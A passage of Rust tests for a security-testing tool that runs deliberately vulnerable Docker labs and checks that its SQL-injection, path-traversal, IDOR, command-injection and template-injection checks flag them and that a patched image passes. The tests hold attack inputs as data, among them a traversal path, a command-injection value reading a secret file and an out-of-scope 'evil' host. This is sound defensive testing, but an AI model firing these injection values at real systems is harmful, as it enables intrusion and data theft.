    /// image actually bakes. Runs offline on every gate, unlike the Docker-gated
    /// traversal tests which self-skip without Docker or the built images, so a
    /// drift between the two copies of the witness cannot hide behind that self-skip
    /// and silently disarm the check (RK-014, CLAUDE.md row 6). `include_str!`
    /// resolves the path across the workspace `exclude` boundary at compile time.
    /// Mutation: change `PATH_TRAVERSAL_WITNESS` or the sentinel file so the two
    /// differ -> this fails.
    #[test]
    fn path_traversal_witness_matches_the_sentinel() {
        let sentinel = include_str!("../../../playground/api/secret.txt");
        assert!(
            sentinel.contains(PATH_TRAVERSAL_WITNESS),
            "PATH_TRAVERSAL_WITNESS {PATH_TRAVERSAL_WITNESS:?} is not the body of \
             playground/api/secret.txt; the check and the fixture have drifted"
        );
    }

    /// The body of bob's seeded object (`objects` id 2); its presence in a response
    /// alice made witnesses that she read across the ownership boundary (#64). Kept
    /// in sync with the db seed, which `idor_witness_matches_the_seed` checks offline.
    const IDOR_WITNESS: &str = "REDSTEP_IDOR_WITNESS_9C2E";

    /// The attacker alice's seeded token (mapped to user `alice` by the api), sent as
    /// the `Authorization` header; bob's object is id 2, alice's own is id 1 whose
    /// body is the positive-control marker.
    const IDOR_ALICE_TOKEN: &str = "tok-alice";
    const IDOR_VICTIM_OBJECT: &str = "/object?id=2";
    const IDOR_OWN_OBJECT: &str = "/object?id=1";
    const IDOR_OWN_BODY: &str = "alice private note";

    /// Guard: bob's object body the IDOR check witnesses is the one the db image
    /// actually seeds. Runs offline on every gate, unlike the Docker-gated IDOR
    /// tests which self-skip without Docker or the built images, so a drift between
    /// the two copies of the witness cannot hide behind that self-skip and silently
    /// disarm the check (RK-014, CLAUDE.md row 6). `include_str!` resolves the path
    /// across the workspace `exclude` boundary at compile time. Mutation: change
    /// `IDOR_WITNESS` or the seed literal so the two differ -> this fails.
    #[test]
    fn idor_witness_matches_the_seed() {
        let seed = include_str!("../../../playground/db/seed.sql");
        assert!(
            seed.contains(IDOR_WITNESS),
            "IDOR_WITNESS {IDOR_WITNESS:?} is not seeded in playground/db/seed.sql; \
             the check and the db seed have drifted"
        );
    }

    /// A one-shot busybox probe: fetch web's `/lookup?name=<name>` and succeed
    /// (exit 0) only if the response carries the witness flag, so the existing
    /// exit-code seam (`classify_probe`) reads the result. `name` is interpolated
    /// into a single-quoted `sh -c` string and is NOT shell-escaped, so callers
    /// must pass a constant (both here do): an attacker-chosen `name` could break
    /// out of the quotes. This is a test probe, not the product-path target string
    /// that `nc_cmd` keeps shell-free for exactly that reason.
    fn sqli_probe_cmd(name: &str) -> Vec<String> {
        vec![
            "sh".to_owned(),
            "-c".to_owned(),
            format!("wget -qO- 'http://web:8080/lookup?name={name}' | grep -q '{SQLI_WITNESS}'"),
        ]
    }

    /// Whether a local image tag exists, so the playground test self-skips (green)
    /// when the `redstep/*:mvp` images have not been built (`playground/build.sh`),
    /// the way `linux_docker_available` self-skips without a daemon.
    fn image_present(image: &str) -> bool {
        std::process::Command::new("docker")
            .args(["image", "inspect", image])
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images): the
    /// bespoke `web -> api -> db` playground exposes a real, exploitable SQLi
    /// (#47 AC 1). It runs locally after `playground/build.sh`; CI does not build
    /// the playground images yet, so there it self-skips rather than running.
    /// An injection through web's `/lookup` returns
    /// the DB-only witness flag (the injection executed), while a benign lookup
    /// does not, so the differential is real rather than a constant-true probe.
    /// It also exercises the readiness gate: `bring_up` returns only once web is
    /// healthy, and web is healthy only when api and the seeded db are, so the
    /// probe does not race a slow-start image. Mutation: have `api` use a
    /// parameterized query (the fix, the check slice) -> the exploit probe no
    /// longer finds the flag -> this fails; make the control use the injection too
    /// -> the control is no longer `false` -> this fails.
    ///
    /// The flat single-segment topology is this demo's: the attacker vantage and
    /// all three tiers share one egress-less network, and `web -> api -> db` is an
    /// application chain by DNS name. The network-segmented boundary ("db not
    /// directly reachable") is the boundary demo's own lab; the enforced port
    /// boundary is M3. It reuses the one-shot probe seam (`run_probe_cmd`) with a
    /// busybox `wget | grep`, so no first-class HTTP capability is built here (that
    /// is the check slice). It lives in-crate because `run_probe_cmd` is
    /// `pub(crate)` and it reads a run-scoped network name off the `RunningLab`.
    #[test]
    fn sqli_playground_is_exploitable() {
        if !linux_docker_available() {
            eprintln!("skipping sqli_playground_is_exploitable: no Linux Docker daemon");
            return;
        }
        for image in ["redstep/web:mvp", "redstep/api:mvp", "redstep/db:mvp"] {
            if !image_present(image) {
                eprintln!(
                    "skipping sqli_playground_is_exploitable: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            pull_image(&docker, PROBE_IMAGE)
                .await
                .expect("pull the probe image");

            let env = Environment::builder()
                .segment("lab")
                .vantage("lab")
                .service("web", "redstep/web:mvp", "lab")
                .service("api", "redstep/api:mvp", "lab")
                .service("db", "redstep/db:mvp", "lab")
                .build()
                .expect("the flat playground environment is valid");

            let lab = bring_up(&docker, &env)
                .await
                .expect("bring up the playground (readiness-gated)");
            let net = lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .name()
                .to_owned();

            let exploit = run_probe_cmd(
                &docker,
                &net,
                sqli_probe_cmd(SQLI_INJECTION),
                Duration::from_secs(10),
            )
            .await;
            let control = run_probe_cmd(
                &docker,
                &net,
                sqli_probe_cmd("welcome"),
                Duration::from_secs(10),
            )
            .await;

            // Clean up before asserting so a failed assertion does not leak the lab.
            let _ = lab.teardown().await;

            let exploited = classify_probe(&exploit.expect("the exploit probe ran"))
                .expect("the exploit probe exited cleanly");
            let control_hit = classify_probe(&control.expect("the control probe ran"))
                .expect("the control probe exited cleanly");
            assert!(
                exploited,
                "the UNION injection returns the DB-only witness flag: the SQLi executed"
            );
            assert!(
                !control_hit,
                "a benign lookup never returns the witness flag: the differential is real"
            );
        });
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images): the
    /// built-in SQLi check verdicts `Fail` against the vulnerable playground and
    /// the `Fail` carries the ADR-0009 domain diagnostic (#50 AC 1). It drives the
    /// oracle (`TestContext`) directly against the flat playground lab rather than
    /// through a registered `#[security_test]`: `run_in_lab` runs every registered
    /// test against one lab, but the boundary demo needs the segmented standin
    /// topology and this needs the flat playground, which cannot be the same lab
    /// (the AC amendment). Mutation: `classify_http_witness` returns `false` on a witnessed
    /// body -> no Fail -> the verdict assertion fails; drop the diagnostic plumbing
    /// in `to_be`/`exploit_sqli_from_vantage` -> the generic text appears -> the
    /// remediation assertion fails. The draft-mirrors-observation check is RK-011.
    #[test]
    fn sqli_check_flags_the_playground() {
        if !linux_docker_available() {
            eprintln!("skipping sqli_check_flags_the_playground: no Linux Docker daemon");
            return;
        }
        for image in ["redstep/web:mvp", "redstep/api:mvp", "redstep/db:mvp"] {
            if !image_present(image) {
                eprintln!(
                    "skipping sqli_check_flags_the_playground: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let env = Environment::builder()
                .segment("lab")
                .vantage("lab")
                .service("web", "redstep/web:mvp", "lab")
                .service("api", "redstep/api:mvp", "lab")
                .service("db", "redstep/db:mvp", "lab")
                .build()
                .expect("the flat playground environment is valid");

            let lab = bring_up(&docker, &env)
                .await
                .expect("bring up the playground (readiness-gated)");
            let vantage = lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();

            let scope = Scope::from_environment(&env);
            let target = scope.resolve("web:8080").expect("web is in scope");
            let request_path = format!("/lookup?name={SQLI_INJECTION}");

            let ctx = crate::TestContext::new_in_lab(scope.clone(), docker.clone(), vantage);
            let recorded = ctx
                .exploit_sqli_from_vantage(&target, &request_path, SQLI_WITNESS)
                .await
                .expect("the vantage SQLi probe ran");
            let observed = recorded.observation.value;
            let confidence = recorded.observation.confidence;
            let verdict = ctx.expect(&recorded).to_be(false);
            let judgements = ctx.take_judgements();
            let drafts = ctx.take_evidence_drafts();

            let _ = lab.teardown().await;

            // The verdict is a security FAIL (the exploit observed `true` against
            // the expected-safe `false`), carrying the domain diagnostic.
            assert_eq!(
                verdict,
                crate::Verdict::Fail,
                "the vulnerable playground is a security FAIL"
            );
            assert!(
                observed,
                "the injection executed (the witness was returned)"
            );
            let (judgement, _) = &judgements[0];
            assert_eq!(judgement.verdict, crate::Verdict::Fail);
            let diagnostic = judgement
                .diagnostic
                .as_ref()
                .expect("a FAIL carries a diagnostic");
            assert!(
                diagnostic.probable_cause.contains(SQLI_WITNESS)
                    && diagnostic.probable_cause.contains("injection"),
                "the domain cause names the witness and the injection, not the generic text: {:?}",
                diagnostic.probable_cause
            );
            assert!(
                diagnostic.remediation.contains("parameterized"),
                "the domain remediation names a parameterized query: {:?}",
                diagnostic.remediation
            );
            // RK-011: the evidence draft mirrors the observation, so the record is
            // not a faithful-looking projection of a constant.
            assert_eq!(drafts[0].capability, "http_sqli_vantage");
            assert_eq!(drafts[0].observed, serde_json::Value::Bool(observed));
            assert_eq!(drafts[0].confidence, confidence);
            // The witness records the STABLE segment "lab", not the run-scoped
            // Docker network name, so a replay can reconstruct it (ADR-0022). This
            // is the call-site guard the pure `http_witness_draft` test cannot give (it is
            // handed a literal segment): mutating `vantage.segment()` to
            // `vantage.name()` in `http_witness_exploit_from` makes these fail.
            assert_eq!(
                drafts[0].source,
                Some(NodeRef::Vantage {
                    segment: "lab".to_owned()
                })
            );
            assert_eq!(
                drafts[0].reproduction.params["vantage_segment"].as_str(),
                Some("lab")
            );
        });
    }

    /// Guard: a vantage draft names its source as a structured `NodeRef::Vantage`
    /// and records the stable segment (not the run-scoped network name) in the
    /// witness, so a replay can reconstruct it. Pure, no Docker. Mutation: in
    /// `vantage_draft` set `source: None`, or key the witness param
    /// `vantage_network` with a run-scoped name instead of `vantage_segment` ->
    /// the literal assertion fails (the Docker path only reaches one segment, so
    /// it cannot catch a hard-coded one here).
    #[test]
    fn vantage_draft_names_its_source_and_witness() {
        let observation = Observation {
            value: true,
            confidence: Confidence::High,
        };
        let draft = vantage_draft(
            "internet",
            "db:5432".to_owned(),
            &observation,
            "reachable",
            Duration::from_millis(2_000),
        );
        assert_eq!(draft.capability, "tcp_connect_vantage");
        assert_eq!(
            draft.source,
            Some(NodeRef::Vantage {
                segment: "internet".to_owned()
            }),
            "the draft names its source as the vantage segment"
        );
        assert_eq!(
            draft.reproduction.params["vantage_segment"].as_str(),
            Some("internet"),
            "the witness records the stable segment, not the run-scoped network"
        );
        assert_eq!(draft.reproduction.params["timeout_ms"], 2_000);
    }

    /// Guard: the vantage draft mirrors the observation and the probed target
    /// rather than hard-coding them, so the recorded evidence matches what the
    /// probe actually saw. The sibling to `build_draft_mirrors_the_observation`
    /// for the vantage path. It uses the decisive unreachable/`Low` case and a
    /// distinctive summary and target, which the source/witness test above does
    /// not, so a hard-coded value cannot pass as a mirrored one. Mutation: set
    /// `observed` to a fixed `true`, `summary` to a constant, or `target` to a
    /// constant in `vantage_draft` -> this fails (the Docker path asserts the
    /// returned observation, not the draft's copy of it, so it cannot catch this).
    #[test]
    fn vantage_draft_mirrors_the_observation() {
        let observation = Observation {
            value: false,
            confidence: Confidence::Low,
        };
        let draft = vantage_draft(
            "internet",
            "db:5432".to_owned(),
            &observation,
            "unreachable",
            Duration::from_millis(2_000),
        );
        assert_eq!(draft.target, "db:5432");
        assert_eq!(draft.intensity, Intensity::Safe);
        assert_eq!(draft.observed, serde_json::Value::Bool(false));
        assert_eq!(draft.confidence, Confidence::Low);
        assert_eq!(draft.summary, "unreachable");
        assert_eq!(draft.reproduction.capability, "tcp_connect_vantage");
        assert_eq!(draft.reproduction.target, "db:5432");
    }

    /// Guard: a witness whose replay inputs cannot be read is rejected rather
    /// than replayed with a default (a witness that cannot be read cannot be
    /// replayed; ADR-0022). Covers a complete witness parsing, a missing
    /// segment, a blank/whitespace segment, a wrong-typed segment, a missing
    /// timeout, a wrong-typed timeout, and an empty target. Mutations, each
    /// caught by one of the `is_err` assertions: delete `.filter(..trim..)` ->
    /// the blank-segment case passes; replace the segment `.ok_or_else(..)?`
    /// with `.unwrap_or("")` -> the missing/wrong-typed cases pass; drop the
    /// `timeout_ms` `.ok_or_else(..)?` -> the missing/wrong-typed timeout cases
    /// pass; drop the empty-target check -> the empty-target case passes.
    #[test]
    fn parse_vantage_witness_rejects_an_incomplete_witness() {
        let complete = Reproduction {
            capability: "tcp_connect_vantage".to_owned(),
            target: "db:5432".to_owned(),
            params: serde_json::json!({ "timeout_ms": 2_000, "vantage_segment": "internet" }),
        };
        let (segment, target, timeout) =
            parse_vantage_witness(&complete).expect("a complete witness parses");
        assert_eq!(segment, "internet");
        assert_eq!(target, "db:5432");
        assert_eq!(timeout, Duration::from_millis(2_000));

        // Each of these cannot be replayed and must error, not default.
        let rejected = [
            (
                "no segment",
                serde_json::json!({ "timeout_ms": 2_000 }),
                "db:5432",
            ),
            (
                "blank segment",
                serde_json::json!({ "timeout_ms": 2_000, "vantage_segment": "   " }),
                "db:5432",
            ),
            (
                "numeric segment",
                serde_json::json!({ "timeout_ms": 2_000, "vantage_segment": 5 }),
                "db:5432",
            ),
            (
                "no timeout",
                serde_json::json!({ "vantage_segment": "internet" }),
                "db:5432",
            ),
            (
                "string timeout",
                serde_json::json!({ "timeout_ms": "2000", "vantage_segment": "internet" }),
                "db:5432",
            ),
            (
                "empty target",
                serde_json::json!({ "timeout_ms": 2_000, "vantage_segment": "internet" }),
                "",
            ),
        ];
        for (label, params, target) in rejected {
            let witness = Reproduction {
                capability: "tcp_connect_vantage".to_owned(),
                target: target.to_owned(),
                params,
            };
            assert!(
                parse_vantage_witness(&witness).is_err(),
                "a witness with {label} cannot be replayed"
            );
        }
    }

    /// Guard: the replay segment lookup returns the network for the *named*
    /// segment, not merely the first, and fails closed when the environment
    /// declares no such segment. Pure, no Docker (the fabricated lab is
    /// `torn_down`). The networks are ordered so the wanted segment is not first.
    /// Mutation: in `vantage_network`, replace the `find` with `networks().first()`
    /// -> the `"internet"` lookup returns the `"internal"` network -> the segment
    /// assertion fails; make the absent case default to the first network instead
    /// of erroring -> the `is_err` assertion fails.
    #[test]
    fn vantage_network_finds_the_named_segment_or_fails_closed() {
        let lab = lab(
            vec![
                net("internal", "net-internal"),
                net("internet", "net-internet"),
            ],
            vec![],
        );
        let found = vantage_network(&lab, "internet").expect("the internet segment is present");
        assert_eq!(
            found.segment(),
            "internet",
            "the lookup returns the named segment's network, not the first"
        );
        assert!(
            vantage_network(&lab, "dmz").is_err(),
            "a segment the environment does not declare fails closed"
        );
    }

    /// Guard: replay re-resolves the witness target through the scope gate
    /// before standing a lab up, so a crafted witness naming a host outside the
    /// environment's scope fails closed (`Error::OutOfScope`) with no Docker
    /// work (ADR-0006). The witness target is attacker-influenced data read back
    /// from a reproduction, so it must not be trusted verbatim. Runs offline
    /// because the resolve precedes `bring_up`; the lazy `Docker` handle is never
    /// used. Mutation: in `replay_vantage_probe`, resolve the target against a
    /// witness-trusting scope (e.g. `Scope::builder().allow(&target)?.build()`)
    /// instead of `Scope::from_environment(env)` -> `evil:1234` resolves ->
    /// replay reaches `bring_up` and no longer returns `OutOfScope` -> this fails.
    #[test]
    fn replay_re_resolves_the_witness_target_through_scope() {
        let env = mvp_env();
        let witness = Reproduction {
            capability: "tcp_connect_vantage".to_owned(),
            target: "evil:1234".to_owned(),
            params: serde_json::json!({ "timeout_ms": 2_000, "vantage_segment": "internet" }),
        };
        let docker = Docker::connect_with_local_defaults().expect("lazy connect");
        let result = block_on(replay_vantage_probe(&docker, &env, &witness));
        assert!(
            matches!(result, Err(Error::OutOfScope { .. })),
            "a witness target outside the env scope is refused before bring-up, got {result:?}"
        );
    }

    /// Guard: `parse_http_witness` reads back every field an HTTP witness replay
    /// needs (capability, segment, target, request_path, marker, request_headers,
    /// timeout) and fails closed on a missing or ill-typed one, including a
    /// capability this build does not know and a malformed `request_headers`, so an
    /// incomplete or unknown-technique witness cannot replay by defaulting (ADR-0022,
    /// parallel to `parse_vantage_witness`). Pure, no Docker. Mutation: drop any one
    /// field's check -> the witness missing it parses -> the matching `rejected` case
    /// fails; drop the unknown-capability arm -> the unknown-capability case parses
    /// -> that assertion fails; map the traversal arm to `HTTP_SQLI_VANTAGE` -> the
    /// traversal round-trip returns the wrong capability -> that assertion fails;
    /// weaken any `request_headers` fail-closed branch to silent tolerance -> the
    /// matching malformed case parses -> it fails.
    #[test]
    fn parse_http_witness_rejects_an_incomplete_witness() {
        let params = serde_json::json!({
            "request_path": "/lookup?name=x",
            "marker": "FLAG123",
            "vantage_segment": "lab",
            "timeout_ms": 5_000,
        });
        let complete = Reproduction {
            capability: "http_sqli_vantage".to_owned(),
            target: "web:8080".to_owned(),
            params: params.clone(),
        };
        let (capability, segment, target, request_path, marker, headers, timeout) =
            parse_http_witness(&complete).expect("a complete witness parses");
        assert_eq!(capability, "http_sqli_vantage");
        assert_eq!(segment, "lab");
        assert_eq!(target, "web:8080");
        assert_eq!(request_path, "/lookup?name=x");
        assert_eq!(marker, "FLAG123");
        assert_eq!(timeout, Duration::from_millis(5_000));
        // A witness with no "request_headers" key (SQLi/traversal) parses as no
        // headers, so the identity channel leaves those techniques unaffected (#64, AC3).
        assert!(
            headers.is_empty(),
            "a witness without a headers key replays with no identity headers"
        );

        // The traversal arm round-trips to its own capability, not SQLi's: a
        // path-traversal witness parses and returns "http_path_traversal_vantage".
        let traversal = Reproduction {
            capability: HTTP_PATH_TRAVERSAL_VANTAGE.to_owned(),
            target: "api:8081".to_owned(),
            params: serde_json::json!({
                "request_path": "/file?path=..%2fsecret.txt",
                "marker": "SENTINEL",
                "vantage_segment": "lab",
                "timeout_ms": 5_000,
            }),
        };
        let (traversal_cap, ..) =
            parse_http_witness(&traversal).expect("a complete traversal witness parses");
        assert_eq!(
            traversal_cap, "http_path_traversal_vantage",
            "the traversal witness resolves to its own capability, not SQLi's"
        );

        // The command-injection arm round-trips to its own capability too (#85):
        // mapping it to another in `parse_http_witness` returns the wrong one here.
        let cmdi = Reproduction {
            capability: HTTP_CMDI_VANTAGE.to_owned(),
            target: "cmdi:8083".to_owned(),
            params: serde_json::json!({
                "request_path": "/exec?cmd=x%3Bcat%20/srv/cmdi_secret.txt",
                "marker": "REDSTEP_CMDI_WITNESS_3D5F",
                "vantage_segment": "lab",
                "timeout_ms": 5_000,
            }),
        };
        let (cmdi_cap, ..) = parse_http_witness(&cmdi).expect("a complete cmdi witness parses");
        assert_eq!(
            cmdi_cap, "http_cmdi_vantage",
            "the command-injection witness resolves to its own capability"
        );

        // The SSTI arm round-trips to its own capability too (#90): mapping it to
        // another in `parse_http_witness` returns the wrong one here.
        let ssti = Reproduction {
            capability: HTTP_SSTI_VANTAGE.to_owned(),
            target: "api:8081".to_owned(),
            params: serde_json::json!({
                "request_path": "/render?tpl=%7B%7B%20flag%20%7D%7D",
                "marker": "REDSTEP_SSTI_WITNESS_7B1A",
                "vantage_segment": "lab",
                "timeout_ms": 5_000,
            }),
        };
        let (ssti_cap, ..) = parse_http_witness(&ssti).expect("a complete ssti witness parses");
        assert_eq!(
            ssti_cap, "http_ssti_vantage",
            "the SSTI witness resolves to its own capability"
        );

        let rejected = [
            ("empty target", "", params.clone()),
            (
                "no request_path",
                "web:8080",
                serde_json::json!({ "marker": "FLAG123", "vantage_segment": "lab", "timeout_ms": 5_000 }),
            ),
            (
                "no marker",
                "web:8080",
                serde_json::json!({ "request_path": "/lookup?name=x", "vantage_segment": "lab", "timeout_ms": 5_000 }),
            ),
            (
                "no vantage_segment",
                "web:8080",
                serde_json::json!({ "request_path": "/lookup?name=x", "marker": "FLAG123", "timeout_ms": 5_000 }),
            ),
            (
                "string timeout",
                "web:8080",
                serde_json::json!({ "request_path": "/lookup?name=x", "marker": "FLAG123", "vantage_segment": "lab", "timeout_ms": "5000" }),
            ),
            // Blank (whitespace-only) string params are rejected too, not just
            // missing ones: the non-blank filter is the guard, and dropping it
            // would let a blank param through (a blank marker, for one, would make
            // the probe's body.contains vacuously true).
            (
                "blank request_path",
                "web:8080",
                serde_json::json!({ "request_path": "   ", "marker": "FLAG123", "vantage_segment": "lab", "timeout_ms": 5_000 }),
            ),
            (
                "blank marker",
                "web:8080",
                serde_json::json!({ "request_path": "/lookup?name=x", "marker": "  ", "vantage_segment": "lab", "timeout_ms": 5_000 }),
            ),
            (
                "blank vantage_segment",
                "web:8080",
                serde_json::json!({ "request_path": "/lookup?name=x", "marker": "FLAG123", "vantage_segment": " ", "timeout_ms": 5_000 }),
            ),
            // A present-but-malformed `request_headers` is fail-closed, not silently
            // dropped (which would replay with no identity): not an array, an entry
            // that is not a 2-pair, and a non-string name or value.
            (
                "request_headers not an array",
                "web:8080",
                serde_json::json!({ "request_path": "/x", "marker": "FLAG123", "vantage_segment": "lab", "timeout_ms": 5_000, "request_headers": 42 }),
            ),
            (
                "request_headers entry not a pair",
                "web:8080",
                serde_json::json!({ "request_path": "/x", "marker": "FLAG123", "vantage_segment": "lab", "timeout_ms": 5_000, "request_headers": [["a"]] }),
            ),
            (
                "request_headers name not a string",
                "web:8080",
                serde_json::json!({ "request_path": "/x", "marker": "FLAG123", "vantage_segment": "lab", "timeout_ms": 5_000, "request_headers": [[1, "v"]] }),
            ),
            (
                "request_headers value not a string",
                "web:8080",
                serde_json::json!({ "request_path": "/x", "marker": "FLAG123", "vantage_segment": "lab", "timeout_ms": 5_000, "request_headers": [["n", 2]] }),
            ),
        ];
        for (label, target, params) in rejected {
            let witness = Reproduction {
                capability: "http_sqli_vantage".to_owned(),
                target: target.to_owned(),
                params,
            };
            assert!(
                parse_http_witness(&witness).is_err(),
                "a witness with {label} cannot be replayed"
            );
        }

        // A witness naming a capability this build does not have is rejected, so it
        // cannot be replayed into the wrong technique (the seam takes a &'static
        // str; the match both resolves the name and fail-closes an unknown one).
        let unknown = Reproduction {
            capability: "http_unknown_vantage".to_owned(),
            target: "web:8080".to_owned(),
            params,
        };
        assert!(
            parse_http_witness(&unknown).is_err(),
            "a witness with an unknown capability cannot be replayed"
        );
    }

    /// Guard: `replay_http_witness_probe` re-resolves the witness target through the env
    /// scope before standing a lab up, so a crafted witness naming a host outside
    /// the environment's scope fails closed (`Error::OutOfScope`) with no Docker
    /// work (ADR-0006, parallel to the vantage replay's guard). Mutation: resolve
    /// against a witness-trusting scope instead of `Scope::from_environment(env)`
    /// -> `evil:1234` resolves -> replay reaches `bring_up` -> this fails.
    #[test]
    fn replay_http_witness_re_resolves_the_witness_target_through_scope() {
        let env = mvp_env();
        let witness = Reproduction {
            capability: "http_sqli_vantage".to_owned(),
            target: "evil:1234".to_owned(),
            params: serde_json::json!({
                "request_path": "/lookup?name=x",
                "marker": "FLAG123",
                "vantage_segment": "internet",
                "timeout_ms": 5_000,
            }),
        };
        let docker = Docker::connect_with_local_defaults().expect("lazy connect");
        let result = block_on(replay_http_witness_probe(&docker, &env, &witness));
        assert!(
            matches!(result, Err(Error::OutOfScope { .. })),
            "a witness target outside the env scope is refused before bring-up, got {result:?}"
        );
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images,
    /// including `redstep/api:fixed`): the SQL-injection attack-to-defense loop
    /// closes. A genuine exploit is recorded against the vulnerable lab, and its
    /// own success witness (the reproduction the recorder emits, not one
    /// hand-assembled here) is replayed against two fresh labs: it reproduces the
    /// exploit against the vulnerable image and is not-exploitable, and
    /// confidently so (a clean negative, not an abnormal `Low`), against one
    /// whose api is the parameterized `redstep/api:fixed`. The built-in SQLi
    /// check (`exploit_sqli_from_vantage`, issue #50) then verdicts `Pass`
    /// against that fixed lab. The vulnerable and fixed labs differ only in the
    /// api image, so the difference is the fix.
    ///
    /// Taking the witness from the recorder makes the round-trip a real guard on
    /// `parse_http_witness`: if parse rejected what `http_witness_draft` writes, the
    /// replay below would `Err`. A positive control probes a benign label on the
    /// fixed lab and requires its row back; it is what distinguishes a working
    /// parameterized query from a "fix" that served an empty body for every
    /// lookup, which would satisfy "the injection is closed" just as well.
    ///
    /// Mutation: revert the `fixed` `lookup` to the concatenated query -> the
    /// replay observes `true` and the fixed-lab check `Fail`s (the fix is
    /// load-bearing) -> this fails. Make the `fixed` `lookup` serve an empty body
    /// for every request -> `benign.value` is `false` -> this fails (the gap the
    /// positive control exists to close). Break
    /// `replay_http_witness_probe`/`parse_http_witness` -> the replay `Err`s and the
    /// `expect` panics.
    #[test]
    fn sqli_fix_and_replay_closes_the_loop() {
        if !linux_docker_available() {
            eprintln!("skipping sqli_fix_and_replay_closes_the_loop: no Linux Docker daemon");
            return;
        }
        for image in [
            "redstep/web:mvp",
            "redstep/api:mvp",
            "redstep/api:fixed",
            "redstep/db:mvp",
        ] {
            if !image_present(image) {
                eprintln!(
                    "skipping sqli_fix_and_replay_closes_the_loop: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let flat = |api_image: &str| {
                Environment::builder()
                    .segment("lab")
                    .vantage("lab")
                    .service("web", "redstep/web:mvp", "lab")
                    .service("api", api_image, "lab")
                    .service("db", "redstep/db:mvp", "lab")
                    .build()
                    .expect("the flat playground environment is valid")
            };
            let vuln_env = flat("redstep/api:mvp");
            let fixed_env = flat("redstep/api:fixed");
            let request_path = format!("/lookup?name={SQLI_INJECTION}");

            // Record a genuine exploit against the vulnerable lab, and take ITS
            // witness: the reproduction `http_witness_exploit_from` actually emits, not a
            // hand-assembled one (the vantage replay guard records its witness the
            // same way). Replaying this round-trips the recorder's own output
            // through `parse_http_witness`.
            let vuln_lab = bring_up(&docker, &vuln_env)
                .await
                .expect("bring up the vulnerable playground");
            let vuln_net = vantage_network(&vuln_lab, "lab").expect("the lab network");
            let vuln_scope = Scope::from_environment(&vuln_env);
            let vuln_target = vuln_scope.resolve("web:8080").expect("web is in scope");
            let (recorded_vuln, draft) = http_witness_exploit_from(
                &docker,
                vuln_net,
                &vuln_target,
                "http_sqli_vantage",
                &request_path,
                SQLI_WITNESS,
                &[],
                Duration::from_millis(5_000),
            )
            .await
            .expect("the recording exploit ran");
            vuln_lab
                .teardown()
                .await
                .expect("teardown after recording the witness");
            let witness = draft.reproduction;

            // Replay the recorded witness against fresh labs of each image: it
            // reproduces the exploit against the vulnerable one and is
            // not-exploitable, confidently so, against the fixed one. Same witness
            // and same environment shape, so the difference is the fix.
            let on_vuln = replay_http_witness_probe(&docker, &vuln_env, &witness)
                .await
                .expect("replay against the vulnerable lab ran");
            let on_fixed = replay_http_witness_probe(&docker, &fixed_env, &witness)
                .await
                .expect("replay against the fixed lab ran");

            // The fixed lab once more, for two checks on one bring-up: a positive
            // control, then the #50 check's Pass.
            let fixed_lab = bring_up(&docker, &fixed_env)
                .await
                .expect("bring up the fixed playground");
            let net = fixed_lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();
            let scope = Scope::from_environment(&fixed_env);
            let target = scope.resolve("web:8080").expect("web is in scope");

            // Positive control: a benign lookup still returns its row. The label's
            // own body is the marker, so a working parameterized query returns it
            // (`true`) and a "fix" that served nothing would not. Without this, an
            // api whose `/lookup` returned an empty body for every request would
            // also show the injection closed, and the loop would vouch for a
            // broken endpoint as a fix.
            let (benign, _) = http_witness_exploit_from(
                &docker,
                &net,
                &target,
                "http_sqli_vantage",
                "/lookup?name=welcome",
                "hello from the api",
                &[],
                Duration::from_millis(5_000),
            )
            .await
            .expect("the benign lookup ran");

            // The #50 check against the fixed lab: it must verdict Pass.
            let ctx = crate::TestContext::new_in_lab(scope.clone(), docker.clone(), net);
            let recorded = ctx
                .exploit_sqli_from_vantage(&target, &request_path, SQLI_WITNESS)
                .await
                .expect("the fixed-lab check ran");
            let verdict = ctx.expect(&recorded).to_be(false);
            let _ = fixed_lab.teardown().await;

            assert!(
                recorded_vuln.value,
                "the recording genuinely exploits the vulnerable lab"
            );
            assert!(
                on_vuln.value,
                "the witness replays as exploited against a fresh vulnerable lab"
            );
            assert!(
                !on_fixed.value,
                "the fix closes it: the same witness is not-exploitable against the fixed lab"
            );
            assert_eq!(
                on_fixed.confidence,
                Confidence::High,
                "the fixed not-exploitable is a confident clean, not an abnormal Low"
            );
            assert!(
                benign.value,
                "positive control: the fixed /lookup still serves a legitimate row, so the fix is a working query and not a broken endpoint"
            );
            assert_eq!(
                benign.confidence,
                Confidence::High,
                "the benign lookup is a confident read, not an abnormal probe"
            );
            assert_eq!(
                verdict,
                crate::Verdict::Pass,
                "the #50 check passes against the fixed lab"
            );
        });
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images): the
    /// native path-traversal check verdicts `Fail` against the vulnerable playground
    /// api and the `Fail` carries the ADR-0009 traversal diagnostic (#63 AC 1). It
    /// drives the oracle directly against a flat `api + db` lab (the traversal is on
    /// the api; the vantage reaches `api:8081` by name). An escaping `?path=`
    /// witnesses the sentinel seeded outside the web root; a benign in-root path
    /// does not, so the differential is real rather than a constant-true probe.
    /// Mutation: have the api `serve_file` canonicalize and refuse the escape (the
    /// fix) -> the probe no longer reads the sentinel -> the verdict assertion
    /// fails; drop the diagnostic plumbing -> the generic text appears -> the
    /// remediation assertion fails; change the diagnostic gate from
    /// `observation.value.then(..)` to `Some(..)` in `exploit_path_traversal_from_vantage`
    /// -> the benign control carries a diagnostic -> the `control.diagnostic.is_none()`
    /// assertion fails. The draft-mirrors-observation check is RK-011.
    #[test]
    fn path_traversal_check_flags_the_playground() {
        if !linux_docker_available() {
            eprintln!("skipping path_traversal_check_flags_the_playground: no Linux Docker daemon");
            return;
        }
        for image in ["redstep/api:mvp", "redstep/db:mvp"] {
            if !image_present(image) {
                eprintln!(
